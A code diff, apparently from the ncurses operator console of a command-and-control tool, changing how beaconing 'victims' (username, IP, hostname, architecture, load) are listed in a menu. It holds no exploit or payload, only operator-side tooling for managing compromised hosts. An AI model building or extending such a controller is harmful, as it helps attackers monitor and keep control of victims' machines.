@@ -165,13 +165,18 @@ char *ncurses_victim_desc_0(char *s0, char *s2){
   return result;
 }
 
-char *ncurses_victim_desc_1(char *s0, char *s1, char *s2, char *s3){
+char *ncurses_victim_desc_1(char *s0, char *s1, char *s2, char *s3, char *s4, char *s5){
   char *arch = "arch:";
   char *release = "release:";
   char *hostname = "hostname:";
   char *load = "load:";
   char *space = " ";
-  char *result = malloc(strlen(arch) +
+  char *at = "@";
+  char *result = malloc(strlen(s4) +
+                        strlen(at) +
+                        strlen(s5) +
+                        strlen(space) +
+                        strlen(arch) +
                         strlen(s0) +
                         strlen(space) +
                         strlen(release) +
@@ -182,7 +187,11 @@ char *ncurses_victim_desc_1(char *s0, char *s1, char *s2, char *s3){
                         strlen(space) +
                         strlen(load) +
                         strlen(s3) + 1);
-  strcpy(result, arch);
+  strcpy(result, s4);
+  strcat(result, at);
+  strcat(result, s5);
+  strcat(result, space);
+  strcat(result, arch);
   strcat(result, s0);
   strcat(result, space);
   strcat(result, release);
@@ -206,12 +215,13 @@ bool ncurses_item_victims(ITEM **items, net_client_beacon_t **p_victims){
     int j = 0;
     for(int i = 0; i < NET_MAX_CLIENTS; ++i){
       if (p_victims[i] != NULL){
-        items[j] = new_item(ncurses_victim_desc_0(p_victims[i]->sysinfo.username,
-                                                  p_victims[i]->sysinfo.ip),
+        items[j] = new_item(p_victims[i]->sysinfo.uuid,
                             ncurses_victim_desc_1(p_victims[i]->sysinfo.arch,
                                                   p_victims[i]->sysinfo.release,
                                                   p_victims[i]->sysinfo.hostname,
-                                                  itoa(p_victims[i]->sysinfo.cpu_usage)));
+                                                  itoa(p_victims[i]->sysinfo.cpu_usage),
+                                                  p_victims[i]->sysinfo.username,
+                                                  p_victims[i]->sysinfo.ip));
         j++;
       }
     }
